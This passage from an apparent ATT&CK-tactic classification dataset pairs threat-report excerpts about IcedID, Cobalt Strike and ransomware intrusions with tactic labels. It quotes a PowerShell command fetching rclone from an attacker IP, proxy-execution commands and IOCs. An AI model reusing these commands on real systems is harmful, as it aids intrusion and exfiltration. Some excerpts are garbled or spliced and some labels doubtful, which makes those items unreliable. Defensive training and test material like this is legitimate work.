        "input": "Described attack activity: IcedID\nIn this case IcedID was observed with the campaign ID of3298576311communicating with a C2 server located at kicknocisd[.]com.\nAfter initial connections, IcedID command and control traffic moved to the following servers.\nConnections to one of the IcedID servers was observed in memory dumps from the beachhead host. This evidence is consistent with the connections to 45.66.248[.]119 observed from the renamed rundll32.exe that loaded the IcedID DLL during maldoc execution at the beginning of this case.\nBackConnect VNC\nDuring the intrusion we also observed connections to a BackConnect VNC IP address. These connections were also spawned from the running IcedID process on the beachhead host.\nAlerts fromLenny Hansson'srulesetfired on the traffic for the following alerts:\nHere's another look at the VNC GUI from the attackers standpoint.\nIn theexecution sectionwe covered utilities launched by the threat actors from the VNC activity.\nWeb Service\nOn the sixth day, the threat actors launched an Edge browser on the beachhead host, via VNC as described in the execution section, and connected to the site dropmefiles[.]com a site that offers free file transfer services. Data connections from the Edge browser in the SRUMDB indicate that a file download occurred but we were unable to determine what the file was or its purpose related to the intrusion.\nCobalt Strike\nThe threat actors dropped and executed a malicious DLL, p1.dll, on the beachhead. This malicious DLL is a Cobalt Strike beacon reaching out to 23.29.115.152/aicsoftware[.]com on ports 757 and 8080. Later the threat actors also injected further beacons into memory reaching out to 50.3.132.232 /iconnectgs[.]com on port 8081. Later on day six, the threat actors added a new Cobalt Strike server to the intrusion, 5.8.18.242 on port 443 (see below for visualizing this activity).\nBeaconing\nBelow is a screenshot of a packet captured from C2 traffic over HTTP. Encrypted POST requests made to iconnectgs[.]com (50.3.132[.]232) are seen:\nCobalt Strike Configurations",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LSASS was accessed by Qbot, with the intention of accessing credentials.This can be observed through the Sysmon process access event, indicating theGrantedAccessvalue of0x1410.\nAdditional evidence of LSASS access was visible in API calls from Qbot injected processes to LSASS.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Affected organizations also included those in Luxembourg, France, the Philippines, Japan, Spain, Malaysia, Norway, and Romania. The targeted industries were consistent with other analyses: telecommunications (including internet service providers) and banking. We also saw a miscellany of targets whose industries comprise internet-related services (such as data center operations), management consulting, information technology, pharmaceutics, insurance, even aviation and education. \nIn the case of Taiwan, we've seen the compromised website diverting its visitors to another malware-hosting site that also acts as platform for C&C communication: sap[.]misapor[.]ch. We saw the affected websites of financial institutions in Uruguay and Mexico redirecting victims to the same URL. While the URL acts similarly to how eye-watch[.]in:443 delivers payloads, we also saw the URL leveraging and exploiting security flaws in Flash: CVE-2015-8651, CVE-2016-1019, and CVE-2016-4117. These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively. \nvaddr=0x0045e620paddr=0x0005d220ordinal=1046sz=20len=19 section=.rdata type=a string=kliyent2podklyuchit vaddr=0x0045e634 paddr=0x0005d234 ordinal=1047 sz=7 len=6 section=.rdata type=a string=ssylka vaddr=0x0045e63c paddr=0x0005d23c ordinal=1048 sz=13len=12 section=.rdata type=a string=ustanavlivat vaddr=0x0045e64c paddr=0x005d24c ordinal=1049 sz=9 len=8 section=.rdata type=a string=poluchit vaddr=0x0045e658 paddr=0x0005d258 ordinal=1050 sz=9 len=8 section=.rdata type=a string=pereslat vaddr=0x0045e664paddr=0x0005d264 ordinal=1051 sz=8len=7 section=.rdata type=a string=derzhat vaddr=0x0045e66c paddr=0x0005d26c ordinal=1052 sz=9 len=8 section=.rdata type=a string=vykhodit vaddr=0x0045e678 paddr=0x0005d278 ordinal=1053 sz=8 len=7 section=.rdata type=a string=Nachalo \n\u672c\u7db2\u7ad9\u4f7f\u7528cookies\u4ee5\u63d0\u4f9b\u6240\u9700\u7684\u7db2\u7ad9\u529f\u80fd,\u6d41\u91cf\u5206\u6790,\u793e\u7fa4\u5a92\u9ad4\u529f\u80fd,\u4ee5\u53ca\u66f4\u512a\u8cea\u8207\u500b\u4eba\u5316\u7684\u8a0a\u606f.\u6211\u5011\u7684cookie \u8072\u660e\u63d0\u4f9b\u66f4\u8a73\u7d30\u8cc7\u8a0a\u53ca\u5982\u4f55\u8abf\u6574\u76ee\u524dcookie\u8a2d\u5b9a \u4e86\u89e3\u66f4\u591a\nRussian-transliterated from Cyrillic script to Latin alphabet, in particular. The verbs used were in their infinitive form, however, which is awkward for a command switch. Case in point: the use of \"ustanavlivat\" (\"to install\") instead of the more command-like \"ustanovit\" (\"do install\"), which gives the impression that the malware operator lifted it from a dictionary or source where words are typically listed in default form. \nAdditionally, using verbs as commands is peculiar, especially for Russian cybercriminals or malware programmers who ironically eschew using Russian language in favor of broken English. Majority-if not all-of Russian programmers know that \"connect\" is keyed in as \"connect\", because there's already an API call (Application Program Interface) under that name. If you really have to use Russian, you'd rather use words like \"vykhod\" (\"quit\") than \"vikhodit\" (\"to exit\"). \nAnother example is the use of \"klyent2podklychit\" we found within the sample we analyzed. The only intelligible part of it was ${}^{\\prime\\prime}2{}^{\\prime\\prime},$ , which can be taken as \"to\" given how there's an API call name for it (client2connect). In Russian, it's practically gibberish, with the words wrongly ordered; it makes much more sense if \"podkluchit_klienta\" was used instead. \nIndeed, with the awkward use of Russian language within the malware, \nLazarus. ",
        "output": "impact",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Description: \nObservable : \nT1218.008 Signed Binary Proxy Execution: Rundll32   \nT1218.008 Signed Binary Proxy Execution: Odbcconf   \nRaspberry Robin uses legitimate Windows utilities like   \nfodhelper.exe and odbcconf.exe to proxy DLL file execution with   \nrundll32.exe   \n\"RUNDLL32.exe\" shell32,ShellExec_RunDLLA   \n\"C:\\WINDOWS\\syswow64\\odbcconf.exe\" -A {regsvr \"C:\\Users\\   \n[redacted]\\AppData\\Local\\Temp\\bznwi.ku.\"} -E -A {configdriver   \nVKIPDSE} -A {SETFILEDSNDIR fnpawxs PXQAND   \nofeslkscqqczuaj} -a {INSTALLDRIVER fqcmypo   \nOGEYSCKXFTBNXAF} ",
        "output": "defense evasion",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the previous phase, we observed that the actors use several tools to get the whole picture of the network infrastructure and bypass the firewall. Afterward, we observed a PowerShell command used to download an effective tool, Rclone, which is used for exfiltration. It also provides an easy and effective way of copying data to several cloud storage providers.\nC:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -command \"$(new-object System.Net.WebClient).DownloadFile('http://195[.]123[.]221[.]7:8080/rclone.exe', 'r.exe')\"\nBased on previous experience, Rclone has frequently been used in ransomware attacks to exfiltrate stolen data. However, it seems that currently, it is not only used in ransomware attacks but also in APT attacks.",
        "output": "exfiltration",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the attackers gained access to the target environment, they then used SMB to copy over and launch the Total Deployment Software administrative tool, allowing remote automated software deployment. Once this tool was installed, the attackers used it to install ScreenConnect (now known as ConnectWise), a remote desktop software application. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: MuddyWater is a relatively new APT that surfaced in 2017. It has focused mainly on governmental targets in Iraq and Saudi Arabia, according to past telemetry. However, the group behind MuddyWater has been known to target other countries in the Middle East, Europe and the US. We recently noticed a large amount of spear phishing documents that appear to be targeting government bodies, military entities, telcos and educational institutions in Jordan, Turkey, Azerbaijan and Pakistan, in addition to the continuous targeting of Iraq and Saudi Arabia, other victims were also detected in Mali, Austria, Russia, Iran and Bahrain.. These new documents have appeared throughout 2018 and escalated from May onwards. The attacks are still ongoing. \nThe new spear-phishing docs used by MuddyWater rely on social engineering to persuade users to enable macros. The attackers rely on a range of compromised hosts to deliver their attacks. In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers' arsenal but also some OPSEC mistakes made by the attackers. \nPrevious related research: \nhttps://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/ ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process Injection\nAs mentioned in theExecutionsection, we see IcedID injecting itself into svchost.exe\nWe also observed Cobalt Strike injecting into gpupdate.exe. Later they injected themselves into svchost.exe. This was done as a result of using named pipe impersonation to get SYSTEM rights on the client.\nDumping PID 4860 from memory and scanning with YARA rules from theLOKI signature basewe can find evidence of the Cobalt Strike injection.\nVolatility dump command:\nScan results:\nWe can get further corroboration with1768.py:\nWe can also use the memory file processed withMemprocFSfor similar YARA scan hits:\nDisable or Modify System Firewall\nWe observed the threat actor attempting to access a restricted host by pivoting through another host.\nThis was attempted by using the built-in netsh portproxy command to port forward 3390 on the local host, to 3389 (RDP) on the remote host.\nStops known services on the host\nGenerates a list of services to stop based on a built-in list and checking each system usingGet-Service \nServices of interest:\nDeletes shadow copies Sets system to boot into recovery mode on next restartMultiple methods to distribute and execute the ransomware Ifdll, userundll32.exeIfexe, useregsvr32.exeUsing different switches depending if there is additional options, or not.\nThe module also supports testing using the-dryrunswitch by not deploying the ransomware binary.\nThe threat actor also referenced multiple examples of running different ransomware variants, possibly indicating overlap between groups, reuse of tooling, or perhaps an affiliate that has used all of the referenced ransomware families.\nEgregorREvilXingQuantumjustrightMount LockerPieperuhmc/ummcottawaConti \nEgregorREvilXingQuantumjustrightMount LockerPieperuhmc/ummcottawaConti \nEgregor \nREvil \nXing \nQuantum \njustright \nMount Locker \nPieper \nuhmc/ummc \nottawa \nConti\nPivoting on indicators\nIn the script there is a function to send messages to their Telegram Bot. This function is used multiple times throughout the script to send updates during execution.\nThe domain resolves to 51.89.133[.]3 which has also been seen used as a Cobalt Strike C2 and to serve beacons during other phases of the intrusion.\nChecking the certificate associated with the IP reveals an interesting association.\n108.62.123[.]147 is also identified in the Command and Control section related to Cobalt Strike.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1105 Ingress Tool Transfer   \nT1219 Remote Access Software   \nT1071.001 Application Layer Protocol: Web Protocols \nWays our customers can detect and block this threat are listed below. \nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here. \nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks. \nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here. \nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat. \nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products. \nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here. \nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them. \nAdditional protection with context to your specific environment and threat data are available from the Firewall Management Center. \nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network. \nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nThe following Snort rule(s) have been developed to detect activity associated with this malicious activity. \nSnort 2 SIDs: 64139, 64140, 64141, 64142, 64143, 64144, 64145, 64146, 64147, 64148, 64149, 64150, 64151, 64152, 64153, 64154, 64155, 64156, 64157, 64158, 64159, 64160, 64161, 64162. \nSnort 3 SIDs: 64153, 64154, 64155, 64156, 64157, 64158, 64159, 64160, 64161, 64162, 301044, 301045, 301046, 301047, 301048, 301049, 301050. \nThe following ClamAV signatures have been developed to detect activity associated with this malicious activity. \nJs.Downloader.Agent-10022279-0   \nVbs.Downloader.Agent-10022291-0   \nWin.Trojan.WasabiSeed-10022304-0   \nJs.Trojan.Screenshotter-10022306-0   \nJs.Trojan.Agent-10022307-0   \nWin.Trojan.Lazy-10022308-0   \nWin.Trojan.Screenshotter-10022309-0   \nPUA.Win.Tool.NetPing-10022493-0   \nWin.Malware.CobaltStrike-10022494-0   \nPUA.Win.Tool.AutoHotKey-10022305-1   \nPUA.Win.Tool.RemoteUtilities-9869515-0   \nPUA.Win.Tool.AdFind-9962378-0   \nTxt.Downloader.AHKBot-10024463-0   \nPs1.Malware.CobaltStrike-10024466-0   \nWin.Infostealer.Rhadamanthys-10024467-0   \nTxt.Infostealer.Rhadamanthys-10024468-0   \nWin.Backdoor.Agent-10025011-0   \nVbs.Trojan.Screenshotter-10025015-0   \nWin.Malware.Warmcookie-10036688-0   \nWin.Malware.CSsharpStreamer-10036641-0 \nIndicators of Compromise \nIndicators of compromise associated with TA866 activity can be found in our GitHub repository here. \nSHARE THIS POST ",
        "output": "command and control",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While performing their activities, threat actors do take certain measures to avoid getting caught. Most common being disabling of Windows Defender AV.\nSigma Rules:\nMicrosoft Defender critical security components disabled (command)\nhttps://github.com/mdecrevoisier/SIGMA-detection-rules/blob/main/windows-defender/defender-critical%20security%20components%20disabled%20(command).yaml\nMicrosoft Defender critical security components disabled (PowerShell)\nhttps://github.com/mdecrevoisier/SIGMA-detection-rules/blob/main/windows-defender/defender-critical%20security%20components%20disabled%20(PowerShell).yaml\nWindows Defender Threat Detection Disabled\nhttps://github.com/SigmaHQ/sigma/blob/f69868b5aa25f33c629208d8868994ed24b20b46/rules/windows/other/win_defender_disabled.yml",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the fifth day, the threat actors moved to their final actions to encrypt the domain. They first pinged systems across the network via an interactive command shell.Iobit unlockerwas also dropped during this phase but we did not see it used. After pinging systems, the threat actors opened a batch file that was ultimately used to launch the Conti ransomware.\nThe locker.bat is a bespoke script designed to encrypt files across a number of hosts:\nBased on the contents of the file we can assess that the actors were likely making last minute adjustments before executing the ransomware based on the ping results.\nThe ransom was then launched via the backup server.\nTo encrypt systems the ransomware mounted the C$ dir for each target host and then performed its encryption routine.\nHere's an overview of the execution:\nAnalysis of the DLLs accompanying the EXE indicates Conti artifacts:\nOnce the encryption was completed, the following ransomware note dropped in all affected directories as 'readme.txt'\nThe content of these text files:\nFollowing the execution of the locker ransomware, the attacker then conducted a file listing discovery against multiple hosts  likely to validate and assess that the locker encryption was successful:",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The initial access was achieved as a result of the user opening what appeared to be a benign workbook, a lure, requiring little user interaction.\nThe workbook contained hidden and password protected worksheets, these were malicious. Module functions also indicated code designed to obfuscate and hide true values and functions.\nThis document and the following DLL were noted as being associated to a BazarCall campaign by@ffforward.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Disable DefenderA base64 encoded PowerShell command was executed on the beachhead which disabled Windows Defender AV (T1562.001). Encoded Command:\nThe decoded base64 PowerShell command uses Set-MpPreference cmdlet to disable Defender's real time monitoring:\nProcess InjectionA number of process injections were seen during this intrusion. The Cobalt Strike beacon used theCreateRemoteThreadWin32 function in order to inject code into running processes. The usage of this function triggers the Sysmon Event ID 8, a well known pattern of CS beacon activity. Remote threads were created in Winlogon and Explorer processes.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For the attack to succeed, the threat actor needed to compromise cloud tenant users with sufficient permissions that would allow the actor to create an application in the cloud environment and give it admin consent. The actor performed credential stuffing attacks against their targets, attempting to access users with the global admin role. The authentication attempts, which originated from a single IP address, were launched against the Azure Active Directory PowerShell application (app ID: 1b730954-1685-4b74-9bfd-dac224a7b894). The same application was later used to deploy the rest of the attack. \nBased on the success ratio of the authentication attempts, it is inferred that the attacker used a dump of compromised credentials. The investigation also revealed that $86\\%$ of the compromised tenants had at least one admin with a real-time high risk score, which means they were flagged by Azure AD Identity Protection to be most likely compromised. It is also important to note that all the compromised admins didn't have MFA enabled, which could have stopped the attack. These observations amplify the importance of securing accounts and monitoring for highrisk users, especially those with high privileges. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first Lateral Movement to the Domain Controller was performed using remote services creation (Executingspoolsv.exevia remote services):\nThespoolsv.exebinary is a Cobalt Strike artifact used for Lateral Movement and C2 which decodes to the configuration below:\nAdditional Lateral Movement technique was observed, where the threat actors used Cobalt Strike'sjump psexec_psh:\nUsing Cyberchef (recipe), we decoded the obfuscated powershell loader, which is using the default named pipe\\.\\pipe\\status_f5:\nThreat actors also pivoted to a domain controller by using the same Cobalt Strike artifacts,spoolsv.exevia remote service creation:\nRight after initial Lateral Movement, a second Cobalt Strike Beaconkaslose64.dllwas executed on a critical server.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Activity observed in this campaign suggests that Mint Sandstorm wrote activity from targets' devices to a series of text files, notably one named documentLoger.txt. \nIn addition to the activity detailed above, in some cases, Mint Sandstorm dropped MischiefTut or MediaPl, custom backdoors. ",
        "output": "collection",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID initially performed some discovery of the local system and the domain.\nLater, Cobalt Strike beacons were used to perform discovery of the system and domain.\nA discovery batch script that runs ADFind.exe was dropped to the system.\nADFind.exe was executed by the discovery batch script.\nPowerView was used to discover local administrator access in the network. The Cobalt Strike beacon itself was used as a proxy to connect and retrieve the PowerView file.\nCobalt Strike was injected into the winlogon.exe process and used to perform further discovery.\nThe following shows the decoded PowerShell commands used by Cobalt Strike to perform discovery.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After initial login, the threat actor ran a few commands that are common to many intrusions using built-in Windows utilities.\nNetscan\nAfter these first commands, the threat actor employed Netscan to perform network discovery. This included copying a config file (netscan.xml) that allowed for several pre-configured custom \"Applications\" referencing batch scripts and binaries dropped in the initial tool drop.\nThe default Netscan only includes a couple of sample \"Applications\"  it appears the threat actor in this case has highly customized the instance of Netscan to use it as a centralized command tool to automate many actions, including removing Antivirus, adding new users, and modifying the firewall, all using PSEXEC. They have \"Application\" commands available to run if the user already has elevated rights or versions of the commands that can be supplied credentials later if elevation is required and obtained in later stages.\nAccording to Netscans' documentation, these applications are just pre-configured commands that can be referenced on discovered hosts once they have been discovered by a scan. Most of these involved custom PSEXEC commands, however, there were a few that used specific binaries observed in the initial tool drop  such as:\nRemote Desktop Plus (rdp.exe)\nSD.exe\nThis binary is interesting, but was not executed during the Incident. It appears to be a self-extracting binary that drops a tool called Snap2HTML (as well as a batch file to execute it for each drive) designed to create a directory listing of a drive. From Snap2HTML's website:\nThe copied netscan.xml also included recent scan histories of previous probable victims targeted by the threat actor, saved in a directory using the Russian phrase \"\u043e\u0442\u0447\u0451\u0442\u044b \u0441\u043e \u0441\u043a\u0430\u043d\u0435\u0440\u0430\" or \"scanner reports\".\nThere were two additional XML outputs included in the tool drop that appear to be output scans from previous intrusions unrelated to this incident as well.\nShare Enumeration with Netscan\nPart of the configuration file for Netscan included options to check for network shares when performing the enumeration.\nThe threat actor configured Netscan to enumerate write-access to network shares; in this case, the Netscan tool was run under domain administrator level access, so all enumerated shares were writable.\nDuring analysis, running this option with Netscan appears to generate a Security Event ID 5145 that references a relative target \"delete[.]me\" generated when performing this write-access check by Netscan .\nThis activity was previously documented in SoftPerfectsupport forumas well as aransomware reportpublished by Vectra in 2022. This provides a detection opportunity for defenders to be able to monitor for this event ID, to identify Netscan network share write enumeration in the early stages of an attack. An experimental Sigma rule has also been included. Similarly, this behavior can be observed over the network with tools like Zeek.\nThe threat actor also used various basic tools to review various files on host and network shares, like browsing remote file shares via a web browser:\nAt one point the threat actor even used MS Paint to review image files on a remote system.\nSeveral other IP discovery scripts were also dropped by the threat actor but were not observed used during this intrusion.\nipall.bat\nipinfo.bat",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the attackers gained access to the target environment, they then used SMB to copy over and launch the Total Deployment Software administrative tool, allowing remote automated software deployment. Once this tool was installed, the attackers used it to install ScreenConnect (now known as ConnectWise), a remote desktop software application. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Tick was spotted last year, but they are actively and silently attacking various organizations in South Korea and Japan for a number of years. While some of the group's tools, tactics, and procedures (TTPs) have been covered within this article, it is likely there is much that still remains uncovered.\nPalo Alto Networks customers are protected by these threats in the following ways:\nAll samples discussed are classified as malicious by the WildFire sandbox platform. \nAll identified domains have been classified as malicious. \nAutoFocus users can track the malware described in this report using Tick campaign tag and various malware tags. \nCustomers running Traps are protected from the discussed threats.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After privilege escalation, the exploit code drops the .vbs, a proof-of-concept malware, into the local Startup folder. \n$=$ 0x10000000u, 2u, 0 2u, 0x80u, 0): $=$ $=$ \"Set aGet $=$ CreateObject(\\\"ADoDB.Stream\\\")\\n\" \"aGet.Mode $\\mathbf{\\mu}=\\mathbf{\\Xi}\\exists\\mathbf{\\Lambda}_{\\mathbf{r}\\mathbf{\\bar{1}}}$ \"aGet.Type $=\\pm15^{\\circ}$ \"aGet.Open() (n\" \"aGet.SaveToFile \\\"c:\\\\Users'\\Public\\\\Documents\\\\oneNote.exe\\\",2\\n\" \"wscript.sleep 1000 $1.17^{11}$ 0x1B9u, 0): ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Just shy of four hours into the intrusion, the threat actors began acting on their final objectives, domain wide ransomware deployment. With their pivot point from one of the domain controllers, the actor used a combination of both PsExec and WMI to remotely execute the ransomware.\nThey first copied the payload,ttsel.exe, to the C$ share of each host on the network.\nPsExec\nThe threat actor utilized the \"-r\" option in PsExec to define a custom name (\"mstdc\") of the remote service created on the target host (by default is PSEXESVC).\nThis resulted in the fileC:\\Windows\\mstdc.exebeing created on the target endpoint when PsExec was executed.\nWMI\nThe alternate execution method the actor employed was a WMI call to start a remote process on the target host.\nThe Quantum ransomware began to encrypt files across all hosts in the environment which then dropped the following ransom note:README_TO_DECRYPT.html\nThe Quantum portal had a unique option to create and set a password to the negotiation chat.\nOnce authenticated, it displays the chat window with the threat actor.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP's as well:\nShortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic:\nFileZillacanleave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog byArtifast, a nice overview can be seen. In this case, we were able to recover part of the.xmlfiles resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1037 Boot or Logon Initialization Scripts   \nT1053 Scheduled Task/Job   \nT1053.003 Cron   \nT1053.005 Scheduled Task   \nT1078 Valid Accounts   \nT1078.002 Domain Accounts T1078.003 Local Accounts   \nT1078.004 Cloud Accounts   \nT1098 Account Manipulation   \nT1098.004 SSH Authorized Keys   \nT1098.005 Device Registration   \nT1133 External Remote Services   \nT1136 Create Account   \nT1136.001 Local Account T1505.003 Web Shell   \nT1543 Create or Modify System Process T1543.002 Systemd Service T1543.003 Windows Service   \nT1546 Event Triggered Execution T1546.003 Windows Management Instrumentation Event Subscription T1546.012 Image File Execution Options Injection   \nT1547 Boot or Logon Autostart Execution T1547.001 Registry Run Keys / Startup Folder T1547.004 Winlogon Helper DLL T1547.009 Shortcut Modification   \nT1556 Modify Authentication Process T1556.006 Multi-Factor Authentication   \nT1574 Hijack Execution Flow T1574.011 Services Registry Permissions Weakness ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While updating the SolarWinds application, the embedded backdoor code loads before the legitimate code executes. Organizations are misled into believing that no malicious activity has occurred and that the program or application dependent on the libraries is behaving as expected. \nThe attackers have compromised signed libraries that used the target companies' own digital certificates, attempting to evade application contr technologies. Microsoft already removed these certificates from its trusted list. The certificate details with the signer hash are shown below: \nThe DLL then loads from the installation folder of the SolarWinds application. Afterwards, the main implant installs as a Windows service and as a DL file in the following path using afolder with different names: \nSolarWinds Orion installation folder, for example, %PROGRAMFILES%\\SolarWinds\\Orion\\SolarWinds.Orion.Core.BusinessLayer.dl The .NET Assembly cache folder (when compiled) %WINDIR%\\System32\\config\\systemprofile\\AppData\\Local\\assembly\\tmp\\ <VARIES>\\SolarWinds.Orion.Core.BusinessLayer.dll \nMicrosoft security researchers observed malicious code from the attacker activated only when running under SolarWinds.BusinessLayerHost.exe process context for the DLL samples currently analyzed. ",
        "output": "execution",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: 001 Data Staging: Local Data Staging| Storing harvested credentials and user/group information in a local CSV file \nData exfiltration \nT1041 Exfiltration Over C2 Channel| Data exfiltration to a C2 server established in the compromised network ",
        "output": "collection",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This actors' campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors. ",
        "output": "impact",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Cobalt Strike beacon payload was successfully injected into the dllhost.exe process as indicated by Sysmon event id 10 in the screenshot below.\nDuring the initial loader execution the threat actor used the Windowsattributility to change the attributes using the following command:\nThe command flags provided perform the following actions:\n+s Sets the System file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file. \n+h Sets the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file. \n/D Appliesattriband any command-line options to directories.\nThis would have hidden the initial access loader files from being visible when browsing via Explorer, lowering the chance of being discovered.\nDuring the intrusion the threat actor dropped SectopRAT to disk in %USERPROFILE%\\AppData\\Local\\Temp.\nThis file was then loaded and executed in memory using MSbuild.exe. The same YARA rule triggered for both the on disk file and on the process memory for MSbuild.exe confirming the link.\nThe MSbuild process was then observed being used for SectopRAT C2 communication covered further in theCommand and Controlsection.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
